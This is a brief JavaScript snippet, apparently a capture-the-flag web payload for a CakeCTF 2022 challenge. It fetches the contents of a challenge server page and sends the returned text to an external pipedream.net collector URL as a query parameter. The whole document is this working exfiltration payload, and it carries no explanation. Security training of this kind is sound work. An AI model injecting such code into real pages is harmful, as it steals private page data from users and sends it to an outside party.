
fetch("http://web1.2022.cakectf.com:8003/").then((res) => {
	return res.text();
}).then(data => {
	fetch("https://enghd2bd35t7sh5.m.pipedream.net/?data="+data);
})
